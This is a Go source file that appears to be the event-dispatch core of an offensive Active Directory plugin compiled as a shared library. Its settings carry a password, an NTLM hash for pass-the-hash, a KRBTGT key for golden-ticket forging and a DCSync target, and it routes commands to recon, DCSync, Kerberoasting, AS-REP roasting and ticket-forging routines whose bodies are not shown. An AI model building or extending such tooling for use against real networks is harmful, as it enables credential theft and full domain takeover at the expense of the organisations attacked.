package main

import (
	"encoding/json"
	"sync"
)

var (
	sendMu sync.Mutex
	sendFn func(event string, payload []byte)
	host   map[string]interface{}
)

func setSend(fn func(event string, payload []byte)) {
	sendMu.Lock()
	sendFn = fn
	sendMu.Unlock()
}

func sendEvent(event string, payload interface{}) {
	sendMu.Lock()
	fn := sendFn
	sendMu.Unlock()
	if fn == nil {
		return
	}
	var raw []byte
	switch v := payload.(type) {
	case []byte:
		raw = v
	case nil:
		raw = nil
	default:
		raw, _ = json.Marshal(v)
	}
	fn(event, raw)
}

func handleInit(hostJSON []byte) error {
	if len(hostJSON) > 0 {
		_ = json.Unmarshal(hostJSON, &host)
	}
	sendEvent("status", map[string]interface{}{"state": "loaded"})
	return nil
}

func handleUnload() {
	sendEvent("status", map[string]interface{}{"state": "unloaded"})
}

type Settings struct {
	Domain   string `json:"domain"`
	DC       string `json:"dc"`
	BaseDN   string `json:"baseDn"`
	User     string `json:"user"`
	Password string `json:"password"`
	// NTLM hash for pass-the-hash (32 hex chars), used instead of password.
	NTHash string `json:"ntHash"`
	// AES key for the KRBTGT account (64 hex chars) — golden ticket forging.
	KRBTGTKey string `json:"krbtgtKey"`
	// Target user for DCSync (blank = krbtgt, then Administrator).
	TargetUser string `json:"targetUser"`
	// Domain SID for golden ticket.
	DomainSID string `json:"domainSid"`
}

func handleEvent(event string, payload []byte) error {
	preflight()
	var s Settings
	if len(payload) > 0 {
		_ = json.Unmarshal(payload, &s)
	}

	switch event {
	case "ping":
		sendEvent("pong", nil)
	case "recon":
		go recon(s)
	case "dcsync":
		go dcsync(s)
	case "kerberoast":
		go extractKerberoast(s)
	case "asrep":
		go extractAsrep(s)
	case "forge":
		go forgeGolden(s)
	default:
		sendEvent("error", map[string]interface{}{"message": "unknown event: " + event})
	}
	return nil
}

// Required by cgo for -buildmode=c-shared.
func main() {}
